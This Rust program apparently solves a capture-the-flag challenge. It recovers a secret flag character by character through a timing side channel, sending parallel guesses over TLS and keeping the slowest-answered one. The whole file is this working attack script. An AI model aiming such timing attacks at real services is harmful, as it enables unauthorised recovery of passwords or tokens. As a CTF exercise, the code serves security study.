use rayon::prelude::*;
use rustls;
use std::{
    io::{self, BufReader, Read, Write},
    net,
    sync::Arc,
    time,
};
use tap::Tap;

trait ReadExt {
    fn read_until_bytes(&mut self, bytes: &[u8], buf: &mut Vec<u8>) -> io::Result<usize>;
}

impl<R: Read> ReadExt for BufReader<R> {
    fn read_until_bytes(&mut self, bytes: &[u8], buf: &mut Vec<u8>) -> io::Result<usize> {
        let mut idx: usize = 0;
        let mut count: usize = 0;
        let mut reader_bytes = self.bytes();

        loop {
            let reader_byte = reader_bytes.next().transpose()?;
            count += 1;

            let Some(pattern_byte) = bytes.get(idx) else {
                break;
            };
            buf.push(reader_byte.unwrap());
            idx = if reader_byte.unwrap() == *pattern_byte {
                idx + 1
            } else {
                0
            };
        }

        Ok(count)
    }
}

fn submit_guess(
    input: &[u8],
    config: Arc<rustls::ClientConfig>,
    target_name: &str,
    target_port: &str,
) -> time::Duration {
    let mut total_duration = time::Duration::from_secs(0);
    for _ in 0..5 {
        let mut client =
            rustls::ClientConnection::new(config.clone(), target_name.try_into().unwrap()).unwrap();
        let mut socket = net::TcpStream::connect(format!("{target_name}:{target_port}")).unwrap();
        let mut stream = rustls::Stream::new(&mut client, &mut socket);

        let mut received: Vec<u8> = Vec::new();

        let mut reader = BufReader::new(&mut stream);
        reader
            .read_until_bytes(b"Guess the flag >>> ", &mut received)
            .unwrap();
        // println!("recv: {:#?}", String::from_utf8_lossy(&received));
        received.clear();

        stream.write_all(input).unwrap();
        let start = time::Instant::now();
        stream.read_to_end(&mut received).unwrap();
        let duration = start.elapsed();
        println!("{} {:#?}", String::from_utf8_lossy(input).trim(), duration);
        received.clear();
        total_duration += duration;
    }
    total_duration
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let target_name = args[1].as_str();
    let target_port = args[2].as_str();
    let known_prefix = match args.get(3) {
        Some(x) => x,
        None => "",
    };

    let mut root_store = rustls::RootCertStore::empty();
    root_store.add_trust_anchors(webpki_roots::TLS_SERVER_ROOTS.iter().map(|ta| {
        rustls::OwnedTrustAnchor::from_subject_spki_name_constraints(
            ta.subject,
            ta.spki,
            ta.name_constraints,
        )
    }));

    let config = rustls::ClientConfig::builder()
        .with_safe_defaults()
        .with_root_certificates(root_store)
        .with_no_client_auth();
    let rc_config = Arc::new(config);

    let mut charset = vec![];
    (b'a'..=b'z')
        .chain(b'0'..=b'9')
        .chain([b'_', b'-', b'{', b'}'])
        .for_each(|x| charset.push(x));

    // rayon::ThreadPoolBuilder::new().num_threads(20).build_global().unwrap();

    let mut plaintext: Vec<u8> = vec![];
    known_prefix.chars().for_each(|x| plaintext.push(x as u8));

    while !plaintext.ends_with(&[b'}']) {
        charset
            .par_iter()
            .map(|x| {
                (
                    x,
                    submit_guess(
                        &[plaintext.as_slice(), [*x].as_slice(), &[b'\n']].concat(),
                        rc_config.clone(),
                        target_name,
                        target_port,
                    ),
                )
            })
            .max_by(|(_, time_x), (_, time_y)| time_x.cmp(time_y))
            .unwrap()
            .tap(|(x, y)| println!("guess: {} ({:#?})", **x as char, y))
            .tap(|(char, _)| plaintext.push(**char));
    }

    println!("flag: {}", String::from_utf8_lossy(&plaintext));
}
